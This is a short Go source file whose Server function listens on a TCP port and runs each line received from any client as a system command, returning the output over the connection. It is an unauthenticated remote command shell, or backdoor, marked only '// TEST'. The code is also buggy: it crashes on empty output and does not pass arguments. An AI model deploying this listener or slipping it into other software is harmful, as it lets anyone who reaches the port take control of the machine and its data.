package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
)

// TEST
func Server(serverPort string) {
	// We prepare parameters to establish connection
	fmt.Println("Hello from server")
	sPort := ":" + serverPort
	tcpAddr, err := net.ResolveTCPAddr("tcp", sPort)
	CheckError(err)
	listener, err := net.ListenTCP("tcp", tcpAddr)
	CheckError(err)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		fmt.Println("Server is listening")

		r := bufio.NewReader(conn)
	Loop: // We read, exec the command and send the output
		for {
			line, err := r.ReadBytes(byte('\n'))
			switch err {
			case nil:
				break
			case io.EOF:
				break Loop
			default:
				fmt.Println("ERROR", err)
			}
			fmt.Printf("%s", string(line))
			out, err := exec.Command(strings.Trim(string(line), "\n")).Output()
			out = out[:len(out)-1]
			out = append(out, []byte("\r")...)
			fmt.Printf("%s", out)
			fmt.Println(out)
			conn.Write(out)
		}
	}
}
